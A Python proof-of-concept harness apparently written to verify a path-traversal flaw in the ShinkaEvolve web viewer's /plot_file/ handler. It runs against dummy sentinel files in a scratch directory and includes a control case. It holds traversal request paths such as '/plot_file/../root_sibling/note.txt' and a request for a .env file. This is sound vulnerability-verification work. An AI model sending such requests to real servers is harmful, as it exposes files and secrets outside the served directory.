#!/usr/bin/env python3
"""Harness for shinka-webui/plot-file-unrestricted-read.

DRAFT. Written from source analysis and not executed yet; its first run happens after approval,
inside the sandbox (see security/DESIGN.md).

Claim under test: the ShinkaEvolve viewer's /plot_file/ handler decides containment with
abspath(path).startswith(abspath(search_root)), so a sibling directory whose name begins with the
search root's name passes the check and its files are returned.

The handler method is called directly on an object built the way the project's own test
(baselines/ShinkaEvolve/tests/test_visualization_meta.py) builds it. No server is started and no
socket is opened.

exploit: request /plot_file/../root_sibling/note.txt with search_root = <scratch>/tree/root.
control: request /plot_file/../other/note.txt (a sibling that does not share the prefix). It must be refused.
observable: the response body contains the sentinel stored in the file outside the search root.

Dummy data only: every file lives under the scratch directory.
"""
import argparse
import io
import json
import os
import sys

SENTINEL_SIBLING = "SENTINEL_SIBLING_7f3a91"
SENTINEL_ENV = "SENTINEL_ENV_7f3a91"


def emit(observed, detail, code=None):
    print("POC_RESULT " + json.dumps({"observed": observed, "detail": detail}))
    sys.exit(code if code is not None else (0 if observed else 3))


def make_handler(handler_cls, search_root, errors):
    handler = handler_cls.__new__(handler_cls)
    handler.search_root = search_root
    handler.send_response = lambda code, *a, **k: errors.append(("status", code))
    handler.send_header = lambda *a, **k: None
    handler.end_headers = lambda: None
    handler.send_error = lambda code, *a, **k: errors.append(("error", code))
    handler.wfile = io.BytesIO()
    return handler


def request(handler_cls, search_root, url_path):
    events = []
    handler = make_handler(handler_cls, search_root, events)
    handler.path = url_path
    handler.handle_serve_plot_file()
    return handler.wfile.getvalue().decode("utf-8", "replace"), events


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=("exploit", "control"), required=True)
    ap.add_argument("--target", required=True)
    ap.add_argument("--scratch", required=True)
    args = ap.parse_args()

    sys.path.insert(0, os.path.join(args.target, "baselines", "ShinkaEvolve"))
    try:
        from shinka.webui.visualization import DatabaseRequestHandler
    except ImportError as e:
        emit(False, {"missing_dependency": str(e)}, code=4)

    tree = os.path.join(args.scratch, "tree")
    root = os.path.join(tree, "root")
    for d, name, text in ((root, ".env", f"DUMMY_KEY={SENTINEL_ENV}\n"),
                          (os.path.join(tree, "root_sibling"), "note.txt", SENTINEL_SIBLING),
                          (os.path.join(tree, "other"), "note.txt", SENTINEL_SIBLING)):
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, name), "w") as f:
            f.write(text)

    if args.mode == "exploit":
        body, events = request(DatabaseRequestHandler, root, "/plot_file/../root_sibling/note.txt")
        # Recorded for the report only: a non-plot file inside the search root.
        in_root_body, in_root_events = request(DatabaseRequestHandler, root, "/plot_file/.env")
        emit(SENTINEL_SIBLING in body, {
            "outside_root_events": events,
            "in_root_env_file_returned": SENTINEL_ENV in in_root_body,
            "in_root_events": in_root_events,
        })
    else:
        body, events = request(DatabaseRequestHandler, root, "/plot_file/../other/note.txt")
        emit(SENTINEL_SIBLING in body, {"events": events})


if __name__ == "__main__":
    main()
